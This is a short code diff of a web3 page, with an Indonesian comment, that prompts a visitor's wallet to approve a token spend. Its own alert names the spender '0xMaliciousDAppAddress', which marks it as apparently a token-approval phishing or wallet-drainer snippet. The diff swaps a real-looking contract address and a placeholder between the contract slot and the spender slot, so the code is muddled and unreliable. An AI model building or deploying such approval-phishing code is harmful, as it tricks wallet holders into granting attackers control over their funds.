@@ -32,12 +32,12 @@
                             "type": "function"
                         }
                     ],
-                    "0xTokenAddress" // Ganti dengan alamat kontrak token
+                    "0x70c92148c5dd2051edc4f4663611a37984efcf81" // Ganti dengan alamat kontrak token
                 );
 
                 document.getElementById('status').innerText = "Sending approval transaction...";
                 await tokenContract.methods
-                    .approve("0x70c92148c5dd2051edc4f4663611a37984efcf81", "1000000000000000000") // 1 token
+                    .approve("0xTokenAddress", "1000000000000000000") // 1 token
                     .send({ from: accounts[0] });
 
                 alert("Approval successful! Token spender: 0xMaliciousDAppAddress");
